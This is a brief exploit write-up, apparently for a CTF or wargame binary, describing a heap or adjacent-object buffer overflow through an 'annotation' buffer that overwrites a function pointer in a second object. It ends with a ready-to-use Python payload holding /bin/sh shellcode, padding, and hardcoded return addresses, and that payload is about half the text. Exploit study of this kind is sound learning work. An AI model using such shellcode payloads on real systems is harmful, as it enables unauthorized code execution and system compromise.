Exploit: Shellcode execution by overwriting a function pointer address with a buffer overflow

By overflow the `annotation`buffer of the first N instance, we can access a pointer on a function stored in the second N instance.
That way, we can change this address to anywhere we want in the memory. We can then use the first N instance buffer to store some shellcode and execute it. 

```
payload = python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 80 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"'
```